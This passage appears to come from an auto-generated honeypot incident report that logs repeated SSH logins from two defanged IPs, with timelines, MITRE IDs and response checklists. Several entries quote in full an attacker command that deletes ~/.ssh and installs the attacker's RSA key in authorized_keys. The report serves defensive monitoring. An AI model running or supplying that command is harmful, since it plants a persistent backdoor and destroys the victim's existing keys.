| **First Seen** | 2026-04-26 06:25 |
| **Last Seen** | 2026-04-26 06:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:25:15` | `cowrie.session.connect` |
| `2026-04-26 06:25:15` | `cowrie.client.version` |
| `2026-04-26 06:25:15` | `cowrie.client.kex` |
| `2026-04-26 06:25:16` | `cowrie.login.success` |
| `2026-04-26 06:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab66bb507ff1

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:26 |
| **Last Seen** | 2026-04-26 06:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:26:08` | `cowrie.session.connect` |
| `2026-04-26 06:26:08` | `cowrie.client.version` |
| `2026-04-26 06:26:08` | `cowrie.client.kex` |
| `2026-04-26 06:26:09` | `cowrie.login.success` |
| `2026-04-26 06:26:09` | `cowrie.session.params` |
| `2026-04-26 06:26:09` | `cowrie.command.input` |
| `2026-04-26 06:26:09` | `cowrie.command.failed` |
| `2026-04-26 06:26:09` | `cowrie.log.closed` |
| `2026-04-26 06:26:09` | `cowrie.session.params` |
| `2026-04-26 06:26:09` | `cowrie.command.input` |
| `2026-04-26 06:26:09` | `cowrie.session.file_download` |
| `2026-04-26 06:26:09` | `cowrie.log.closed` |
| `2026-04-26 06:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83eab1d6264a

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:26 |
| **Last Seen** | 2026-04-26 06:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:26:11` | `cowrie.session.connect` |
| `2026-04-26 06:26:11` | `cowrie.client.version` |
| `2026-04-26 06:26:11` | `cowrie.client.kex` |
| `2026-04-26 06:26:12` | `cowrie.login.success` |
| `2026-04-26 06:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef9b2ccc7266

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:27 |
| **Last Seen** | 2026-04-26 06:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:27:06` | `cowrie.session.connect` |
| `2026-04-26 06:27:06` | `cowrie.client.version` |
| `2026-04-26 06:27:06` | `cowrie.client.kex` |
| `2026-04-26 06:27:07` | `cowrie.login.success` |
| `2026-04-26 06:27:07` | `cowrie.session.params` |
| `2026-04-26 06:27:07` | `cowrie.command.input` |
| `2026-04-26 06:27:07` | `cowrie.command.failed` |
| `2026-04-26 06:27:07` | `cowrie.log.closed` |
| `2026-04-26 06:27:08` | `cowrie.session.params` |
| `2026-04-26 06:27:08` | `cowrie.command.input` |
| `2026-04-26 06:27:08` | `cowrie.session.file_download` |
| `2026-04-26 06:27:08` | `cowrie.log.closed` |
| `2026-04-26 06:27:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceaed5dbf9fc

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:27 |
| **Last Seen** | 2026-04-26 06:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:27:10` | `cowrie.session.connect` |
| `2026-04-26 06:27:10` | `cowrie.client.version` |
| `2026-04-26 06:27:10` | `cowrie.client.kex` |
| `2026-04-26 06:27:10` | `cowrie.login.success` |
| `2026-04-26 06:27:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e226ab8bd6f

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:29 |
| **Last Seen** | 2026-04-26 06:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:29:02` | `cowrie.session.connect` |
| `2026-04-26 06:29:02` | `cowrie.client.version` |
| `2026-04-26 06:29:03` | `cowrie.client.kex` |
| `2026-04-26 06:29:03` | `cowrie.login.success` |
| `2026-04-26 06:29:03` | `cowrie.session.params` |
| `2026-04-26 06:29:03` | `cowrie.command.input` |
| `2026-04-26 06:29:03` | `cowrie.command.failed` |
| `2026-04-26 06:29:03` | `cowrie.log.closed` |
| `2026-04-26 06:29:04` | `cowrie.session.params` |
| `2026-04-26 06:29:04` | `cowrie.command.input` |
| `2026-04-26 06:29:04` | `cowrie.session.file_download` |
| `2026-04-26 06:29:04` | `cowrie.log.closed` |
| `2026-04-26 06:29:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9962e6f431f2

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:29 |
| **Last Seen** | 2026-04-26 06:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:29:06` | `cowrie.session.connect` |
| `2026-04-26 06:29:06` | `cowrie.client.version` |
| `2026-04-26 06:29:06` | `cowrie.client.kex` |
| `2026-04-26 06:29:06` | `cowrie.login.success` |
| `2026-04-26 06:29:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-796525d18a93

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:30 |
| **Last Seen** | 2026-04-26 06:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:30:03` | `cowrie.session.connect` |
| `2026-04-26 06:30:03` | `cowrie.client.version` |
| `2026-04-26 06:30:04` | `cowrie.client.kex` |
| `2026-04-26 06:30:04` | `cowrie.login.success` |
| `2026-04-26 06:30:04` | `cowrie.session.params` |
| `2026-04-26 06:30:04` | `cowrie.command.input` |
| `2026-04-26 06:30:04` | `cowrie.command.failed` |
| `2026-04-26 06:30:04` | `cowrie.log.closed` |
| `2026-04-26 06:30:05` | `cowrie.session.params` |
| `2026-04-26 06:30:05` | `cowrie.command.input` |
| `2026-04-26 06:30:05` | `cowrie.session.file_download` |
| `2026-04-26 06:30:05` | `cowrie.log.closed` |
| `2026-04-26 06:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e0cef497c0b

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:30 |
| **Last Seen** | 2026-04-26 06:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:30:07` | `cowrie.session.connect` |
| `2026-04-26 06:30:07` | `cowrie.client.version` |
| `2026-04-26 06:30:07` | `cowrie.client.kex` |
| `2026-04-26 06:30:07` | `cowrie.login.success` |
| `2026-04-26 06:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c00750df079

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:30 |
| **Last Seen** | 2026-04-26 06:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:30:31` | `cowrie.session.connect` |
| `2026-04-26 06:30:31` | `cowrie.client.version` |
| `2026-04-26 06:30:31` | `cowrie.client.kex` |
| `2026-04-26 06:30:31` | `cowrie.login.success` |
| `2026-04-26 06:30:32` | `cowrie.session.params` |
| `2026-04-26 06:30:32` | `cowrie.command.input` |
| `2026-04-26 06:30:32` | `cowrie.command.failed` |
| `2026-04-26 06:30:32` | `cowrie.log.closed` |
| `2026-04-26 06:30:32` | `cowrie.session.params` |
| `2026-04-26 06:30:32` | `cowrie.command.input` |
| `2026-04-26 06:30:32` | `cowrie.session.file_download` |
| `2026-04-26 06:30:32` | `cowrie.log.closed` |
| `2026-04-26 06:30:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24f2074f4c64

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:30 |
| **Last Seen** | 2026-04-26 06:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:30:34` | `cowrie.session.connect` |
| `2026-04-26 06:30:34` | `cowrie.client.version` |
| `2026-04-26 06:30:34` | `cowrie.client.kex` |
| `2026-04-26 06:30:34` | `cowrie.login.success` |
| `2026-04-26 06:30:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d50db3455c1a

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:31 |
| **Last Seen** | 2026-04-26 06:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:31:07` | `cowrie.session.connect` |
| `2026-04-26 06:31:07` | `cowrie.client.version` |
| `2026-04-26 06:31:07` | `cowrie.client.kex` |
| `2026-04-26 06:31:08` | `cowrie.login.success` |
| `2026-04-26 06:31:08` | `cowrie.session.params` |
| `2026-04-26 06:31:08` | `cowrie.command.input` |
| `2026-04-26 06:31:08` | `cowrie.command.failed` |
| `2026-04-26 06:31:08` | `cowrie.log.closed` |
| `2026-04-26 06:31:08` | `cowrie.session.params` |
| `2026-04-26 06:31:08` | `cowrie.command.input` |
| `2026-04-26 06:31:08` | `cowrie.session.file_download` |
| `2026-04-26 06:31:08` | `cowrie.log.closed` |
| `2026-04-26 06:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a29b41113db

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:31 |
| **Last Seen** | 2026-04-26 06:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:31:10` | `cowrie.session.connect` |
| `2026-04-26 06:31:10` | `cowrie.client.version` |
| `2026-04-26 06:31:10` | `cowrie.client.kex` |
| `2026-04-26 06:31:11` | `cowrie.login.success` |
| `2026-04-26 06:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26de09c8e4cb

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:32 |
| **Last Seen** | 2026-04-26 06:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:32:03` | `cowrie.session.connect` |
| `2026-04-26 06:32:03` | `cowrie.client.version` |
| `2026-04-26 06:32:03` | `cowrie.client.kex` |
| `2026-04-26 06:32:04` | `cowrie.login.success` |
| `2026-04-26 06:32:04` | `cowrie.session.params` |
| `2026-04-26 06:32:04` | `cowrie.command.input` |
| `2026-04-26 06:32:04` | `cowrie.command.failed` |
| `2026-04-26 06:32:04` | `cowrie.log.closed` |
| `2026-04-26 06:32:04` | `cowrie.session.params` |
| `2026-04-26 06:32:04` | `cowrie.command.input` |
| `2026-04-26 06:32:04` | `cowrie.session.file_download` |
| `2026-04-26 06:32:04` | `cowrie.log.closed` |
| `2026-04-26 06:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-629543f06ef6

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:32 |
| **Last Seen** | 2026-04-26 06:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:32:06` | `cowrie.session.connect` |
| `2026-04-26 06:32:06` | `cowrie.client.version` |
| `2026-04-26 06:32:06` | `cowrie.client.kex` |
| `2026-04-26 06:32:07` | `cowrie.login.success` |
| `2026-04-26 06:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd8d48ba382d

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:32 |
| **Last Seen** | 2026-04-26 06:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:32:26` | `cowrie.session.connect` |
| `2026-04-26 06:32:26` | `cowrie.client.version` |
| `2026-04-26 06:32:26` | `cowrie.client.kex` |
| `2026-04-26 06:32:26` | `cowrie.login.success` |
| `2026-04-26 06:32:27` | `cowrie.session.params` |
| `2026-04-26 06:32:27` | `cowrie.command.input` |
| `2026-04-26 06:32:27` | `cowrie.command.failed` |
| `2026-04-26 06:32:27` | `cowrie.log.closed` |
| `2026-04-26 06:32:27` | `cowrie.session.params` |
| `2026-04-26 06:32:27` | `cowrie.command.input` |
| `2026-04-26 06:32:27` | `cowrie.session.file_download` |
| `2026-04-26 06:32:27` | `cowrie.log.closed` |
| `2026-04-26 06:32:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be9c4249f2b7

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:32 |
| **Last Seen** | 2026-04-26 06:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:32:29` | `cowrie.session.connect` |
| `2026-04-26 06:32:29` | `cowrie.client.version` |
| `2026-04-26 06:32:29` | `cowrie.client.kex` |
| `2026-04-26 06:32:29` | `cowrie.login.success` |
| `2026-04-26 06:32:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2626c62733a

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:32 |
| **Last Seen** | 2026-04-26 06:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
